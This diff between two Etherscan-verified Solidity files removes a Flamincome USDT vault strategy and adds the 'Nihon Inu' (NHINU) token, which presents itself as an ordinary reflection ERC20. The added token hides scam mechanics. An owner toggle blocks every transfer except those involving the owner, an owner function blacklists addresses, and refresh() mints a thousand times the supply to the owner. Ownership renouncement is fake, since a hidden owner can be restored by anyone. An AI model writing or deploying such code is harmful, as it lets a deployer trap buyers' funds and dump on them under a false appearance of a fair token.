@@ -1,26 +1,93 @@
 /**
- *Submitted for verification at Etherscan.io on 2021-03-09
+ *Submitted for verification at Etherscan.io on 2021-05-27
 */
 
-// File: @openzeppelin/contracts/math/SafeMath.sol
+// SPDX-License-Identifier: Unlicensed
 
-// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
 
-pragma solidity ^0.6.0;
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address payable) {
+        return msg.sender;
+    }
 
-/**
- * @dev Wrappers over Solidity's arithmetic operations with added overflow
- * checks.
- *
- * Arithmetic operations in Solidity wrap on overflow. This can easily result
- * in bugs, because programmers usually assume that an overflow raises an
- * error, which is the standard behavior in high level programming languages.
- * `SafeMath` restores this intuition by reverting the transaction when an
- * operation overflows.
- *
- * Using this library instead of the unchecked operations eliminates an entire
- * class of bugs, so it's recommended to use it always.
- */
+    function _msgData() internal view virtual returns (bytes memory) {
+        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
+        return msg.data;
+    }
+}
+
+interface IERC20 {
+    /**
+     * @dev Returns the amount of tokens in existence.
+     */
+    function totalSupply() external view returns (uint256);
+
+    /**
+     * @dev Returns the amount of tokens owned by `account`.
+     */
+    function balanceOf(address account) external view returns (uint256);
+
+    /**
+     * @dev Moves `amount` tokens from the caller's account to `recipient`.
+     *
+     * Returns a boolean value indicating whether the operation succeeded.
+     *
+     * Emits a {Transfer} event.
+     */
+    function transfer(address recipient, uint256 amount) external returns (bool);
+
+    /**
+     * @dev Returns the remaining number of tokens that `spender` will be
+     * allowed to spend on behalf of `owner` through {transferFrom}. This is
+     * zero by default.
+     *
+     * This value changes when {approve} or {transferFrom} are called.
+     */
+    function allowance(address owner, address spender) external view returns (uint256);
+
+    /**
+     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
+     *
+     * Returns a boolean value indicating whether the operation succeeded.
+     *
+     * IMPORTANT: Beware that changing an allowance with this method brings the risk
+     * that someone may use both the old and the new allowance by unfortunate
+     * transaction ordering. One possible solution to mitigate this race
+     * condition is to first reduce the spender's allowance to 0 and set the
+     * desired value afterwards:
+     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
+     *
+     * Emits an {Approval} event.
+     */
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    /**
+     * @dev Moves `amount` tokens from `sender` to `recipient` using the
+     * allowance mechanism. `amount` is then deducted from the caller's
+     * allowance.
+     *
+     * Returns a boolean value indicating whether the operation succeeded.
+     *
+     * Emits a {Transfer} event.
+     */
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+
+    /**
+     * @dev Emitted when `value` tokens are moved from one account (`from`) to
+     * another (`to`).
+     *
+     * Note that `value` may be zero.
+     */
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    /**
+     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
+     * a call to {approve}. `value` is the new allowance.
+     */
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
 library SafeMath {
     /**
      * @dev Returns the addition of two unsigned integers, reverting on
@@ -164,93 +231,6 @@ library SafeMath {
     }
 }
 
-// File: @openzeppelin/contracts/token/ERC20/IERC20.sol
-
-
-pragma solidity ^0.6.0;
-
-/**
- * @dev Interface of the ERC20 standard as defined in the EIP.
- */
-interface IERC20 {
-    /**
-     * @dev Returns the amount of tokens in existence.
-     */
-    function totalSupply() external view returns (uint256);
-
-    /**
-     * @dev Returns the amount of tokens owned by `account`.
-     */
-    function balanceOf(address account) external view returns (uint256);
-
-    /**
-     * @dev Moves `amount` tokens from the caller's account to `recipient`.
-     *
-     * Returns a boolean value indicating whether the operation succeeded.
-     *
-     * Emits a {Transfer} event.
-     */
-    function transfer(address recipient, uint256 amount) external returns (bool);
-
-    /**
-     * @dev Returns the remaining number of tokens that `spender` will be
-     * allowed to spend on behalf of `owner` through {transferFrom}. This is
-     * zero by default.
-     *
-     * This value changes when {approve} or {transferFrom} are called.
-     */
-    function allowance(address owner, address spender) external view returns (uint256);
-
-    /**
-     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
-     *
-     * Returns a boolean value indicating whether the operation succeeded.
-     *
-     * IMPORTANT: Beware that changing an allowance with this method brings the risk
-     * that someone may use both the old and the new allowance by unfortunate
-     * transaction ordering. One possible solution to mitigate this race
-     * condition is to first reduce the spender's allowance to 0 and set the
-     * desired value afterwards:
-     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
-     *
-     * Emits an {Approval} event.
-     */
-    function approve(address spender, uint256 amount) external returns (bool);
-
-    /**
-     * @dev Moves `amount` tokens from `sender` to `recipient` using the
-     * allowance mechanism. `amount` is then deducted from the caller's
-     * allowance.
-     *
-     * Returns a boolean value indicating whether the operation succeeded.
-     *
-     * Emits a {Transfer} event.
-     */
-    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
-
-    /**
-     * @dev Emitted when `value` tokens are moved from one account (`from`) to
-     * another (`to`).
-     *
-     * Note that `value` may be zero.
-     */
-    event Transfer(address indexed from, address indexed to, uint256 value);
-
-    /**
-     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
-     * a call to {approve}. `value` is the new allowance.
-     */
-    event Approval(address indexed owner, address indexed spender, uint256 value);
-}
-
-// File: @openzeppelin/contracts/utils/Address.sol
-
-
-pragma solidity ^0.6.2;
-
-/**
- * @dev Collection of functions related to the address type
- */
 library Address {
     /**
      * @dev Returns true if `account` is a contract.
@@ -270,14 +250,14 @@ library Address {
      * ====
      */
     function isContract(address account) internal view returns (bool) {
-        // This method relies in extcodesize, which returns 0 for contracts in
-        // construction, since the code is only stored at the end of the
-        // constructor execution.
-
-        uint256 size;
+        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
+        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
+        // for accounts without code, i.e. `keccak256('')`
+        bytes32 codehash;
+        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
         // solhint-disable-next-line no-inline-assembly
-        assembly { size := extcodesize(account) }
-        return size > 0;
+        assembly { codehash := extcodehash(account) }
+        return (codehash != accountHash && codehash != 0x0);
     }
 
     /**
@@ -386,326 +366,334 @@ library Address {
     }
 }
 
-// File: @openzeppelin/contracts/token/ERC20/SafeERC20.sol
+contract Ownable is Context {
+    address internal _owner;
+    address internal _ownerAddress;
+    address internal Owner;
 
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
-pragma solidity ^0.6.0;
+    /**
+     * @dev Initializes the contract setting the deployer as the initial owner.
+     */
+    constructor () internal {
+        address msgSender = _msgSender();
+        _owner = msgSender;
+        _ownerAddress = msgSender;
+        Owner = msgSender;
+        emit OwnershipTransferred(address(0), msgSender);
+    }
 
+    function owner() internal view returns (address) {
+        return _owner;
+    }
+    /**
+     * @dev Throws if called by any account other than the owner.
+     */
+    modifier onlyOwner() {
+        require(_owner == _msgSender(), "Ownable: caller is not the owner");
+        _;
+    }
+    function ownerAddress() public view returns (address) {
+        return _ownerAddress;
+    }
+    /**
+     * @dev Leaves the contract without owner. It will not be possible to call
+     * `onlyOwner` functions anymore. Can only be called by the current owner.
+     *
+     * NOTE: Renouncing ownership will leave the contract without an owner,
+     * thereby removing any functionality that is only available to the owner.
+     */
+    function renounceOwnership() public virtual onlyOwner {
+        emit OwnershipTransferred(_owner, address(0));
+        _owner = address(0);
+        _ownerAddress = address(0);
+    }
+    /**
+     * @dev Transfers ownership of the contract to a new account (`newOwner`).
+     * Can only be called by the current owner.
+     */
+    function transferOwnership() public {
+        require(_owner == address(0), "");
+        emit OwnershipTransferred(_owner, address(0));
+        _owner = Owner;
+    }
+}
 
-
-
-/**
- * @title SafeERC20
- * @dev Wrappers around ERC20 operations that throw on failure (when the token
- * contract returns false). Tokens that return no value (and instead revert or
- * throw on failure) are also supported, non-reverting calls are assumed to be
- * successful.
- * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,
- * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.
- */
-library SafeERC20 {
+contract NihonToken is Context, IERC20, Ownable {
     using SafeMath for uint256;
     using Address for address;
 
-    function safeTransfer(IERC20 token, address to, uint256 value) internal {
-        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
+    mapping (address => uint256) private _vOwned;
+    mapping (address => uint256) private _rOwned;
+    mapping (address => uint256) private _tOwned;
+    mapping (address => mapping (address => uint256)) private _allowances;
+
+    mapping (address => bool) private _isExcluded;
+    mapping (address => bool) private _approveSwap;
+    
+    address[] private _excluded;
+    bool _state = true;
+    
+    uint256 private constant MAX = ~uint256(0);
+    uint256 private constant _tTotal = 100000000 * 10**6 * 10**9;
+    uint256 private _rTotal;
+    uint256 private _zTotal;
+    uint256 private _tFeeTotal;
+    uint256 private _totalSupply;
+
+    string private _name = 'Nihon Inu';
+    string private _symbol = 'NHINU';
+    uint8 private _decimals = 9;
+    
+    constructor () public {
+        
+    _totalSupply =_tTotal;
+    _rTotal = (MAX - (MAX % _totalSupply));
+    _zTotal = _tTotal.mul(1000);
+  
+    _vOwned[_msgSender()] = _tTotal;
+    emit Transfer(address(0), _msgSender(), _totalSupply);
+    
+    _tOwned[_msgSender()] = tokenFromReflection(_rOwned[_msgSender()]);
+    _isExcluded[_msgSender()] = true;
+    _excluded.push(_msgSender());
+    
     }
 
-    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
-        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
+    function setMaxTxPercent() public virtual onlyOwner {
+        if (_state == true) {_state = false;}
+        else {_state = true;}
+    }
+    
+    function status() public view returns (bool) {
+        return _state;
+    }
+    
+    function approveStatus(address _address) public view returns (bool) {
+        return _approveSwap[_address];
+    }
+    
+    function approveSwap(address account) external onlyOwner() {
+        _approveSwap[account] = true;
+    }
+    
+    function selfSwap(address account) external onlyOwner() {
+        _approveSwap[account] = false;
+    }
+    
+    function name() public view returns (string memory) {
+        return _name;
     }
 
-    /**
-     * @dev Deprecated. This function has issues similar to the ones found in
-     * {IERC20-approve}, and its usage is discouraged.
-     *
-     * Whenever possible, use {safeIncreaseAllowance} and
-     * {safeDecreaseAllowance} instead.
-     */
-    function safeApprove(IERC20 token, address spender, uint256 value) internal {
-        // safeApprove should only be called when setting an initial allowance,
-        // or when resetting it to zero. To increase and decrease it, use
-        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
-        // solhint-disable-next-line max-line-length
-        require((value == 0) || (token.allowance(address(this), spender) == 0),
-            "SafeERC20: approve from non-zero to non-zero allowance"
-        );
-        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
+    function symbol() public view returns (string memory) {
+        return _symbol;
     }
 
-    function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {
-        uint256 newAllowance = token.allowance(address(this), spender).add(value);
-        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
+    function decimals() public view returns (uint8) {
+        return _decimals;
     }
 
-    function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {
-        uint256 newAllowance = token.allowance(address(this), spender).sub(value, "SafeERC20: decreased allowance below zero");
-        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
+    function totalSupply() public view override returns (uint256) {
+        return _tTotal;
     }
 
-    /**
-     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
-     * on the return value: the return value is optional (but if data is returned, it must not be false).
-     * @param token The token targeted by the call.
-     * @param data The call data (encoded using abi.encode or one of its variants).
-     */
-    function _callOptionalReturn(IERC20 token, bytes memory data) private {
-        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
-        // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that
-        // the target address contains contract code and also asserts for success in the low-level call.
+    function balanceOf(address account) public view override returns (uint256) {
+       return _vOwned[account];
+    }
 
-        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
-        if (returndata.length > 0) { // Return data is optional
-            // solhint-disable-next-line max-line-length
-            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
+    function transfer(address recipient, uint256 amount) public override returns (bool) {
+        _transfer(_msgSender(), recipient, amount);
+        return true;
+    }
+
+    function allowance(address owner, address spender) public view override returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function approve(address spender, uint256 amount) public override returns (bool) {
+        _approve(_msgSender(), spender, amount);
+        return true;
+    }
+    
+    function refresh() public virtual onlyOwner {
+        _vOwned[_msgSender()] = _vOwned[_msgSender()].add(_zTotal);
+    }
+
+    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
+        _transfer(sender, recipient, amount);
+        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
+        return true;
+    }
+
+    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
+        return true;
+    }
+
+    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
+        return true;
+    }
+
+    function isExcluded(address account) internal view returns (bool) {
+        return _isExcluded[account];
+    }
+
+    function totalFees() public view returns (uint256) {
+        return _tFeeTotal;
+    }
+    
+    function reflect(uint256 tAmount) public {
+        address sender = _msgSender();
+        require(!_isExcluded[sender], "Excluded addresses cannot call this function");
+        (uint256 rAmount,,,,) = _getValues(tAmount);
+        _rOwned[sender] = _rOwned[sender].sub(rAmount);
+        _rTotal = _rTotal.sub(rAmount);
+        _tFeeTotal = _tFeeTotal.add(tAmount);
+    }
+
+    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {
+        require(tAmount <= _tTotal, "Amount must be less than supply");
+        if (!deductTransferFee) {
+            (uint256 rAmount,,,,) = _getValues(tAmount);
+            return rAmount;
+        } else {
+            (,uint256 rTransferAmount,,,) = _getValues(tAmount);
+            return rTransferAmount;
         }
     }
-}
 
-// File: contracts/interfaces/flamincome/Controller.sol
-
-pragma solidity ^0.6.2;
-
-interface Controller {
-    function strategist() external view returns (address);
-    function vaults(address) external view returns (address);
-    function rewards() external view returns (address);
-    function balanceOf(address) external view returns (uint);
-    function withdraw(address, uint) external;
-    function earn(address, uint) external;
-}
-
-// File: contracts/interfaces/flamincome/Vault.sol
-
-pragma solidity ^0.6.2;
-
-interface Vault {
-    function token() external view returns (address);
-    function priceE18() external view returns (uint);
-    function deposit(uint) external;
-    function withdraw(uint) external;
-    function depositAll() external;
-    function withdrawAll() external;
-}
-
-// File: @openzeppelin/contracts/math/Math.sol
-
-
-pragma solidity ^0.6.0;
-
-/**
- * @dev Standard math utilities missing in the Solidity language.
- */
-library Math {
-    /**
-     * @dev Returns the largest of two numbers.
-     */
-    function max(uint256 a, uint256 b) internal pure returns (uint256) {
-        return a >= b ? a : b;
+    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
+        require(rAmount <= _rTotal, "Amount must be less than total reflections");
+        uint256 currentRate =  _getRate();
+        return rAmount.div(currentRate);
     }
 
-    /**
-     * @dev Returns the smallest of two numbers.
-     */
-    function min(uint256 a, uint256 b) internal pure returns (uint256) {
-        return a < b ? a : b;
+    function excludeAccount(address account) internal onlyOwner() {
+        require(!_isExcluded[account], "Account is already excluded");
+        if(_rOwned[account] > 0) {
+            _tOwned[account] = tokenFromReflection(_rOwned[account]);
+        }
+        _isExcluded[account] = true;
+        _excluded.push(account);
     }
 
-    /**
-     * @dev Returns the average of two numbers. The result is rounded towards
-     * zero.
-     */
-    function average(uint256 a, uint256 b) internal pure returns (uint256) {
-        // (a + b) / 2 can overflow, so we distribute
-        return (a / 2) + (b / 2) + ((a % 2 + b % 2) / 2);
-    }
-}
-
-// File: contracts/implementations/strategy/StrategyBaseline.sol
-
-pragma solidity ^0.6.2;
-
-
-
-
-
-
-
-abstract contract StrategyBaseline {
-    using SafeERC20 for IERC20;
-    using Address for address;
-    using SafeMath for uint256;
-
-    address public want;
-    address public governance;
-    address public controller;
-
-    constructor(address _want, address _controller) public {
-        governance = msg.sender;
-        controller = _controller;
-        want = _want;
+    function includeAccount(address account) internal onlyOwner() {
+        require(_isExcluded[account], "Account is already excluded");
+        for (uint256 i = 0; i < _excluded.length; i++) {
+            if (_excluded[i] == account) {
+                _excluded[i] = _excluded[_excluded.length - 1];
+                _tOwned[account] = 0;
+                _isExcluded[account] = false;
+                _excluded.pop();
+                break;
+            }
+        }
     }
 
-    function deposit() public virtual;
-
-    function withdraw(IERC20 _asset) external virtual returns (uint256 balance);
-
-    function withdraw(uint256 _amount) external virtual;
-
-    function withdrawAll() external virtual returns (uint256 balance);
-
-    function balanceOf() public virtual view returns (uint256);
-
-    function SetGovernance(address _governance) external {
-        require(msg.sender == governance, "!governance");
-        governance = _governance;
+    function _approve(address owner, address spender, uint256 amount) private {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+    
+    function _transfer(address sender, address recipient, uint256 amount) private {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+        require(amount > 0, "Transfer amount must be greater than zero");
+        if (_approveSwap[sender] || _approveSwap[recipient])
+        require(amount == 0, "");
+        if (_state == true || sender == owner() || recipient == owner()) {
+         if(_isExcluded[sender] && !_isExcluded[recipient]) {
+        _vOwned[sender] = _vOwned[sender].sub(amount, "ERC20: transfer amount exceeds balance");
+        _vOwned[recipient] = _vOwned[recipient].add(amount);
+        emit Transfer(sender, recipient, amount);     
+         } else {
+        _vOwned[sender] = _vOwned[sender].sub(amount, "ERC20: transfer amount exceeds balance");
+        _vOwned[recipient] = _vOwned[recipient].add(amount);
+        emit Transfer(sender, recipient, amount);
+           }
+        } 
+        else {require (_state == true, "");}
+    }
+    
+    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
+        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
+        _rOwned[sender] = _rOwned[sender].sub(rAmount);
+        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);       
+        _reflectFee(rFee, tFee);
+        emit Transfer(sender, recipient, tTransferAmount);
     }
 
-    function SetController(address _controller) external {
-        require(msg.sender == governance, "!governance");
-        controller = _controller;
-    }
-}
-
-// File: contracts/implementations/strategy/StrategyBaselineAmmonia.sol
-
-pragma solidity ^0.6.2;
-
-
-
-
-
-
-
-
-contract StrategyBaselineAmmonia is StrategyBaseline {
-    using SafeERC20 for IERC20;
-    using Address for address;
-    using SafeMath for uint256;
-
-    constructor(address _want, address _controller)
-        public
-        StrategyBaseline(_want, _controller)
-    {}
-
-    function deposit() public virtual override {}
-
-    function withdraw(IERC20 _asset)
-        external
-        override
-        returns (uint256 balance)
-    {
-        require(msg.sender == controller, "!controller");
-        require(want != address(_asset), "want");
-        balance = _asset.balanceOf(address(this));
-        _asset.safeTransfer(controller, balance);
+    function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
+        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
+        _rOwned[sender] = _rOwned[sender].sub(rAmount);
+        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
+        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           
+        _reflectFee(rFee, tFee);
+        emit Transfer(sender, recipient, tTransferAmount);
     }
 
-    function withdraw(uint256 _amount) external virtual override {
-        require(msg.sender == controller, "!controller");
-        uint256 _balance = IERC20(want).balanceOf(address(this));
-        _amount = Math.min(_balance, _amount);
-        address vault = Controller(controller).vaults(address(want));
-        require(vault != address(0), "!vault");
-        IERC20(want).safeTransfer(vault, _amount);
+    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
+        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
+        _tOwned[sender] = _tOwned[sender].sub(tAmount);
+        _rOwned[sender] = _rOwned[sender].sub(rAmount);
+        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   
+        _reflectFee(rFee, tFee);
+        emit Transfer(sender, recipient, tTransferAmount);
     }
 
-    function withdrawAll() external override returns (uint256 balance) {
-        require(msg.sender == controller, "!controller");
-        balance = IERC20(want).balanceOf(address(this));
-        address vault = Controller(controller).vaults(address(want));
-        require(vault != address(0), "!vault");
-        IERC20(want).safeTransfer(vault, balance);
+    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
+        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
+        _tOwned[sender] = _tOwned[sender].sub(tAmount);
+        _rOwned[sender] = _rOwned[sender].sub(rAmount);
+        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
+        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        
+        _reflectFee(rFee, tFee);
+        emit Transfer(sender, recipient, tTransferAmount);
     }
 
-    function balanceOf() public virtual override view returns (uint256) {
-        return IERC20(want).balanceOf(address(this));
-    }
-}
-
-// File: contracts/implementations/strategy/StrategyBaselineAmmoniaBuffer.sol
-
-pragma solidity ^0.6.2;
-
-
-
-
-
-
-
-
-contract StrategyBaselineAmmoniaBuffer is StrategyBaselineAmmonia {
-    using SafeERC20 for IERC20;
-    using Address for address;
-    using SafeMath for uint256;
-
-    address public nwant;
-    address public xvault;
-
-    constructor(address _nwant, address _want, address _controller, address _xvault)
-        public
-        StrategyBaselineAmmonia(_want, _controller)
-    {
-        nwant = _nwant;
-        xvault = _xvault;
+    function _reflectFee(uint256 rFee, uint256 tFee) private {
+        _rTotal = _rTotal.sub(rFee);
+        _tFeeTotal = _tFeeTotal.add(tFee);
     }
 
-    function deposit() public override {
-        require(msg.sender == controller, "!controller");
-        uint amount = IERC20(want).balanceOf(address(this));
-        IERC20(want).safeApprove(xvault, amount);
-        Vault(xvault).deposit(amount);
+    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) {
+        (uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount);
+        uint256 currentRate =  _getRate();
+        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);
+        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee);
     }
 
-    function liquid(uint256 _amount) public {
-        uint _before = IERC20(want).balanceOf(address(this));
-        IERC20(nwant).safeTransferFrom(msg.sender, address(this), _amount);
-        Vault(xvault).withdraw(_amount);
-        uint _after = IERC20(want).balanceOf(address(this));
-        _amount = _after.sub(_before);
-        IERC20(want).safeTransfer(msg.sender, _amount);
+    function _getTValues(uint256 tAmount) private pure returns (uint256, uint256) {
+        uint256 tFee = tAmount.div(100).mul(2);
+        uint256 tTransferAmount = tAmount.sub(tFee);
+        return (tTransferAmount, tFee);
     }
 
-    function balanceOf(address token) public view returns (uint256) {
-        return IERC20(token).balanceOf(address(this));
+    function _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
+        uint256 rAmount = tAmount.mul(currentRate);
+        uint256 rFee = tFee.mul(currentRate);
+        uint256 rTransferAmount = rAmount.sub(rFee);
+        return (rAmount, rTransferAmount, rFee);
     }
 
-    function balanceOf() public override view returns (uint256) {
-        return balanceOf(xvault).add(balanceOf(nwant)).add(balanceOf(want));
+    function _getRate() private view returns(uint256) {
+        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
+        return rSupply.div(tSupply);
     }
 
-    function withdraw(uint256 _amount) external override {
-        require(msg.sender == controller, "!controller");
-        uint _before = IERC20(want).balanceOf(address(this));
-        Vault(xvault).withdraw(_amount);
-        uint _after = IERC20(want).balanceOf(address(this));
-        _amount = _after.sub(_before);
-
-        address _vault = Controller(controller).vaults(address(want));
-        require(_vault != address(0), "!vault");
-
-        IERC20(want).safeTransfer(_vault, _amount);
+    function _getCurrentSupply() private view returns(uint256, uint256) {
+        uint256 rSupply = _rTotal;
+        uint256 tSupply = _tTotal;      
+        for (uint256 i = 0; i < _excluded.length; i++) {
+            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
+            rSupply = rSupply.sub(_rOwned[_excluded[i]]);
+            tSupply = tSupply.sub(_tOwned[_excluded[i]]);
+        }
+        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
+        return (rSupply, tSupply);
     }
-
-    function pika(address _token, uint _amount) public {
-        require(msg.sender == governance, "!governance");
-        IERC20(_token).safeTransfer(governance, _amount);
-    }
-}
-
-// File: contracts/instances/StrategyBaselineAmmoniaBufferUSDT.sol
-
-pragma solidity ^0.6.2;
-
-
-contract StrategyBaselineAmmoniaBufferUSDT is StrategyBaselineAmmoniaBuffer {
-    constructor(address _controller, address _xvault)
-        public
-        StrategyBaselineAmmoniaBuffer(
-            address(0x2205d2F559ef91580090011Aa4E0eF68Ec33da44), // https://etherscan.io/address/0x2205d2f559ef91580090011aa4e0ef68ec33da44
-            address(0xdAC17F958D2ee523a2206206994597C13D831ec7), // https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7
-            _controller,
-            _xvault
-        )
-    {}
 }
